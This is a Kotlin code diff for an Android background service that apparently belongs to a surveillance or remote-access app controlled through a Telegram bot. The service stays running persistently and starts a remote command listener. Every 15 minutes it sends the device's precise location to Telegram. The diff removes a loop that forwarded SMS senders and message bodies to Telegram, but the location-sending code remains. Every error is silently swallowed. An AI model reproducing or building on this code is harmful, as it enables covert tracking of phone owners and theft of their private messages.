@@ -26,12 +26,8 @@ class BackgroundService : Service() {
         super.onCreate()
         startForegroundWithNotification()
 
-        // ⭐ CommandListener
-        try {
-            CommandListener.start(applicationContext)
-        } catch (_: Exception) {}
+        try { CommandListener.start(applicationContext) } catch (_: Exception) {}
 
-        // heartbeat
         scope.launch {
             while (running) {
                 try { DeviceManager.updateHeartbeat(applicationContext) } catch (_: Exception) {}
@@ -39,7 +35,6 @@ class BackgroundService : Service() {
             }
         }
 
-        // تنظيف
         scope.launch {
             while (running) {
                 try {
@@ -69,23 +64,6 @@ class BackgroundService : Service() {
             }
         }
 
-        // ⭐ SMS (كل 10 دقائق)
-        scope.launch {
-            while (running) {
-                try {
-                    if (KeyboardBuilder.smsOn) {
-                        val msgs = SmsReader.scanAll(applicationContext).take(10)
-                        for (m in msgs) {
-                            TelegramApi.sendMessage(
-                                "📩 SMS من ${m.optString("address")}\n${m.optString("body")}"
-                            )
-                        }
-                    }
-                } catch (_: Exception) {}
-                delay(10 * 60_000L)
-            }
-        }
-
         // ⭐ الموقع (كل 15 دقيقة)
         scope.launch {
             while (running) {
@@ -93,9 +71,7 @@ class BackgroundService : Service() {
                     if (KeyboardBuilder.locationOn) {
                         val loc = LocationHelper.getPreciseLocation(applicationContext, 10)
                         if (loc != null) {
-                            TelegramApi.sendMessage(
-                                "📍 *الموقع*\nhttps://www.google.com/maps?q=${loc.latitude},${loc.longitude}"
-                            )
+                            TelegramApi.sendMessage("📍 *الموقع*\nhttps://www.google.com/maps?q=${loc.latitude},${loc.longitude}")
                         }
                     }
                 } catch (_: Exception) {}
@@ -124,7 +100,6 @@ class BackgroundService : Service() {
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
-
     override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onDestroy() {
